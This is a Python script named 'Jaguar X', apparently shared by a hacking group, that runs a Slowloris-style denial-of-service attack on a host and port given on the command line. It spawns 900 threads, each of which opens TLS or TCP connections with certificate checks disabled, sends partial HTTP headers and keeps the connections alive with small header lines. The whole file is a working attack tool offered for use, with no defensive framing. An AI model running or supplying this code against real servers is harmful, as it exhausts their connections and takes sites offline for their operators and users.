#!/usr/bin/env python3
# Jaguar X
#  1001
# Tested December 2025 
# Molimno

import socket
import ssl
import threading
import time
import random
import sys

print("""
     █▀▄▀█ █▀▀ █▀▀ █▄█ █▀█ █▀█ █▀█
     █░▀░█ █▄▄ █▄▄ ░█░ █▄█ █▀▀ █▄█
              Tested Edition
  MolimnoComunity 
           
""")

if len(sys.argv) != 3:
    print("Usage: python3 jaguarx.py <host> <port>")
    print("Example: python3 jaguarx.py site.com 443")
    sys.exit()

host = sys.argv[1]
port = int(sys.argv[2])
threads = 900
sockets = []

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            
            s.connect((host, port))
            sockets.append(s)
            
            # Real working Slowloris + partial header flood
            s.send(f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept: text/html\r\n")
            
            # Keep connection alive forever with tiny chunks
            while True:
                s.send(b"X-a: b\r\n")
                time.sleep(12)  # Below most timeouts, above keep-alive probes
                
        except:
            if s in sockets:
                sockets.remove(s)
            continue

print(f"[+] Jaguar X locked on {host}:{port}")
print(f"[+] Spawning {threads} threads - real Slowloris + connection exhaustion")
time.sleep(2)

for _ in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

try:
    while True:
        print(f"\r[+] Active connections: {len(sockets)} - Attemping Attack...", end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Jaguar X stopped.")
